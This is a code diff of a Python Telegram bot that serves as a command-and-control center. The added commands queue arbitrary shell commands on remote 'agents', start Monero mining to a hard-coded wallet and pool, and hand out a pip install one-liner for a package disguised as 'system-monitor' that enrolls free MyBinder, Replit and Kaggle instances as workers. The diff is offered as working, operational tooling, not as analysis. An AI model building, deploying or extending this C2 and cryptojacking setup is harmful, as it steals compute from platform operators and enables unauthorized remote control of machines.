@@ -1,8 +1,11 @@
 #!/usr/bin/env python3
 """
-Telegram C2 Bot - Runs alongside C2 server
-Handles commands and notifications from agents
-Integrates with C2 SQLite database
+Telegram C2 Control Center - Full Integration
+Central command hub for all C2 operations:
+- Agent management
+- Worker/miner deployment
+- Task distribution
+- System monitoring
 """
 
 import os
@@ -13,6 +16,7 @@ import re
 import sqlite3
 import threading
 import requests
+import subprocess
 from datetime import datetime
 from pathlib import Path
 
@@ -26,9 +30,14 @@ POLL_INTERVAL = 3
 BASE_DIR = Path(__file__).resolve().parent.parent
 DB_PATH = BASE_DIR / "data" / "c2.db"
 
+# Mining config
+MINING_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
+MINING_POOL = "xmrpool.eu:3333"
+
 # State
 last_update_id = 0
 agents = {}
+pending_tasks = {}  # agent_id -> list of tasks
 
 def get_db():
     """Get database connection."""
@@ -42,12 +51,10 @@ def save_agent_to_db(agent_id, hostname, platform, username="agent", os_type="li
         conn = get_db()
         db = conn.cursor()
         
-        # Check if exists
         db.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
         existing = db.fetchone()
         
         if existing:
-            # Update last_seen
             db.execute("""
                 UPDATE agents 
                 SET last_seen=datetime('now'), is_alive=1, hostname=?, platform_type=?
@@ -55,7 +62,6 @@ def save_agent_to_db(agent_id, hostname, platform, username="agent", os_type="li
             """, (hostname, platform, agent_id))
             print(f"[TG-DB] Updated agent {agent_id[:8]}")
         else:
-            # Insert new agent
             db.execute("""
                 INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type, is_alive)
                 VALUES (?, ?, ?, ?, ?, ?, ?, 1)
@@ -68,6 +74,36 @@ def save_agent_to_db(agent_id, hostname, platform, username="agent", os_type="li
     except Exception as e:
         print(f"[TG-DB-ERROR] {e}")
         return False
+
+def get_agents_from_db():
+    """Get all agents from database."""
+    try:
+        conn = get_db()
+        db = conn.cursor()
+        db.execute("SELECT * FROM agents WHERE is_alive=1 ORDER BY last_seen DESC")
+        rows = db.fetchall()
+        conn.close()
+        return [dict(row) for row in rows]
+    except Exception as e:
+        print(f"[TG-DB-ERROR] {e}")
+        return []
+
+def add_task_to_db(agent_id, task_type, command):
+    """Add task to database."""
+    try:
+        conn = get_db()
+        db = conn.cursor()
+        db.execute("""
+            INSERT INTO tasks (agent_id, task_type, command, status, created_at)
+            VALUES (?, ?, ?, 'pending', datetime('now'))
+        """, (agent_id, task_type, command))
+        task_id = db.lastrowid
+        conn.commit()
+        conn.close()
+        return task_id
+    except Exception as e:
+        print(f"[TG-DB-ERROR] {e}")
+        return None
 
 def send_message(text, chat_id=None, parse_mode="HTML"):
     """Send message via Telegram API."""
@@ -96,61 +132,200 @@ def get_updates(offset=0, timeout=30):
         return {"ok": False, "result": []}
 
 def handle_command(message):
-    """Handle bot commands."""
+    """Handle bot commands - Full C2 Control Center."""
     text = message.get("text", "")
     chat_id = message["chat"]["id"]
     user = message["from"].get("first_name", "User")
     
     print(f"[TG-CMD] {user}: {text}")
     
-    if text == "/start":
-        send_message(f"""🤖 <b>C2 Bot Online</b>
+    # Parse command and args
+    parts = text.split(maxsplit=2)
+    cmd = parts[0].lower() if parts else ""
+    arg1 = parts[1] if len(parts) > 1 else ""
+    arg2 = parts[2] if len(parts) > 2 else ""
+    
+    if cmd == "/start":
+        send_message(f"""🤖 <b>C2 Control Center</b>
 
 Welcome, {user}!
 
-<b>Commands:</b>
-/status - Show connected agents
+<b>Agent Commands:</b>
 /agents - List all agents
-/help - Show help
+/status - Server status
+/stats - Mining statistics
 
-<b>Agent auto-connects when started.</b>
+<b>Control Commands:</b>
+/deploy [platform] - Deploy new worker
+/mine [agent_id] - Start mining on agent
+/stop [agent_id] - Stop agent
+/cmd [agent_id] [command] - Execute command
+
+<b>Platforms:</b>
+• mybinder - Jupyter notebooks
+• replit - Replit containers
+• kaggle - Kaggle kernels
+
+<b>Quick Start:</b>
+<code>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</code>
 """, chat_id)
     
-    elif text == "/status":
+    elif cmd == "/status":
+        agents_list = get_agents_from_db()
+        alive_count = len([a for a in agents_list if a.get('is_alive')])
+        
         send_message(f"""📊 <b>C2 Status</b>
 
 Server: <code>Running</code>
-Agents: <code>{len(agents)} connected</code>
-Time: <code>{datetime.now().isoformat()}</code>
+Agents: <code>{alive_count} online</code>
+Mode: <code>Telegram Direct API</code>
+Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>
+
+<b>Resources:</b>
+• Database: <code>✓</code>
+• Bot: <code>✓</code>
+• Mining Pool: <code>{MINING_POOL}</code>
 """, chat_id)
     
-    elif text == "/agents":
-        if not agents:
-            send_message("📭 No agents connected", chat_id)
-        else:
-            msg = "📋 <b>Connected Agents:</b>\n\n"
-            for aid, info in agents.items():
-                msg += f"• <code>{aid[:8]}</code> - {info.get('platform', 'unknown')}\n"
-            send_message(msg, chat_id)
+    elif cmd == "/agents":
+        agents_list = get_agents_from_db()
+        
+        if not agents_list:
+            send_message("📭 No agents in database", chat_id)
+            return
+        
+        msg = f"📋 <b>Agents ({len(agents_list)}):</b>\n\n"
+        for a in agents_list[:20]:  # Limit to 20
+            status = "🟢" if a.get('is_alive') else "🔴"
+            msg += f"{status} <code>{a['id'][:8]}</code> {a.get('hostname', '?')[:15]}\n"
+            msg += f"   Platform: {a.get('platform_type', '?')}\n"
+        
+        send_message(msg, chat_id)
     
-    elif text == "/help":
-        send_message("""📖 <b>C2 Bot Help</b>
+    elif cmd == "/deploy":
+        platform = arg1 or "mybinder"
+        
+        msg = f"""🚀 <b>Deploy Worker</b>
 
-<b>Commands:</b>
+Platform: <code>{platform}</code>
+
+<b>Install command:</b>
+<code>pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon</code>
+
+<b>Deploy URLs:</b>
+• MyBinder: https://gke.mybinder.org/v2/gh/GaredBerns/system-monitor/main
+• Replit: https://replit.com/@GaredBerns/system-monitor
+• Kaggle: https://kaggle.com/code/garedberns/system-monitor
+
+After deployment, agent will auto-connect here.
+"""
+        send_message(msg, chat_id)
+    
+    elif cmd == "/mine":
+        agent_id = arg1
+        
+        if not agent_id:
+            send_message("⚠️ Usage: /mine [agent_id]\n\nUse /agents to list IDs", chat_id)
+            return
+        
+        # Add mining task
+        task_id = add_task_to_db(agent_id, "mine", f"start_mine:{MINING_POOL}:{MINING_WALLET}")
+        
+        if task_id:
+            send_message(f"""⛏️ <b>Mining Task Created</b>
+
+Agent: <code>{agent_id[:8]}</code>
+Task ID: {task_id}
+Pool: <code>{MINING_POOL}</code>
+Wallet: <code>{MINING_WALLET[:20]}...</code>
+
+Task will be executed on next beacon.
+""", chat_id)
+        else:
+            send_message(f"❌ Failed to create task for {agent_id[:8]}", chat_id)
+    
+    elif cmd == "/stop":
+        agent_id = arg1
+        
+        if not agent_id:
+            send_message("⚠️ Usage: /stop [agent_id]", chat_id)
+            return
+        
+        task_id = add_task_to_db(agent_id, "control", "stop")
+        send_message(f"🛑 Stop task created for <code>{agent_id[:8]}</code>", chat_id)
+    
+    elif cmd == "/cmd":
+        agent_id = arg1
+        command = arg2
+        
+        if not agent_id or not command:
+            send_message("⚠️ Usage: /cmd [agent_id] [command]", chat_id)
+            return
+        
+        task_id = add_task_to_db(agent_id, "exec", command)
+        send_message(f"💻 Command queued for <code>{agent_id[:8]}</code>\n<code>{command}</code>", chat_id)
+    
+    elif cmd == "/stats":
+        # Get mining stats from database
+        try:
+            conn = get_db()
+            db = conn.cursor()
+            
+            # Count total agents
+            db.execute("SELECT COUNT(*) FROM agents")
+            total = db.fetchone()[0]
+            
+            # Count alive agents
+            db.execute("SELECT COUNT(*) FROM agents WHERE is_alive=1")
+            alive = db.fetchone()[0]
+            
+            # Count tasks
+            db.execute("SELECT COUNT(*) FROM tasks WHERE status='completed'")
+            completed = db.fetchone()[0]
+            
+            conn.close()
+            
+            send_message(f"""📈 <b>C2 Statistics</b>
+
+<b>Agents:</b>
+• Total: {total}
+• Online: {alive}
+• Offline: {total - alive}
+
+<b>Tasks:</b>
+• Completed: {completed}
+
+<b>Mining:</b>
+• Pool: {MINING_POOL}
+• Wallet: XMR
+""", chat_id)
+        except Exception as e:
+            send_message(f"❌ Stats error: {e}", chat_id)
+    
+    elif cmd == "/help":
+        send_message("""📖 <b>C2 Control Center Help</b>
+
+<b>Monitoring:</b>
 /start - Start bot
 /status - Server status
-/agents - List agents
-/help - This message
+/agents - List all agents
+/stats - Statistics
 
-<b>Agent Usage:</b>
-<code>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</code>
+<b>Deployment:</b>
+/deploy [platform] - Deploy worker
 
-Agent will auto-connect to this bot.
+<b>Control:</b>
+/mine [agent_id] - Start mining
+/stop [agent_id] - Stop agent
+/cmd [agent_id] [cmd] - Execute command
+
+<b>Agent ID:</b>
+Use first 8 characters from /agents list
 """, chat_id)
     
     else:
-        # Unknown command - forward to all agents as task
-        send_message(f"📤 Command forwarded to agents: {text}", chat_id)
+        # Unknown command
+        send_message(f"❓ Unknown command: {cmd}\n\nUse /help for commands", chat_id)
 
 def handle_agent_message(message):
     """Handle messages from agents (contains agent data)."""
